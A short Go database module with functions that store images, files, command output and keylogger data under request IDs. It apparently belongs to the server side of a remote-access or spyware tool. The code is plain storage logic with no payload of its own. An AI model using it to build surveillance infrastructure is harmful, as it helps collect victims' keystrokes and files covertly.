package db

import (
	"database/sql"
	"fmt"
	"time"
)

func insertData(db *sql.DB, table, requestID string, data []byte) error {
	query := fmt.Sprintf("INSERT INTO %s (request_id, data, exec_time) VALUES (?, ?, ?)", table)
	_, err := db.Exec(query, requestID, data, time.Now())
	return err
}

func StoreImage(db *sql.DB, requestID string, imgData []byte) error {
	return insertData(db, TABLE_IMAGES, requestID, imgData)
}

func StoreFile(db *sql.DB, requestID string, fileData []byte) error {
	return insertData(db, TABLE_FILES, requestID, fileData)
}

func StoreCommand(db *sql.DB, requestID string, cmdOutput []byte) error {
	return insertData(db, TABLE_COMMANDS, requestID, cmdOutput)
}

func StoreKeylogger(db *sql.DB, requestID string, keyloggerData []byte) error {
	return insertData(db, TABLE_KEYLOGS, requestID, keyloggerData)
}
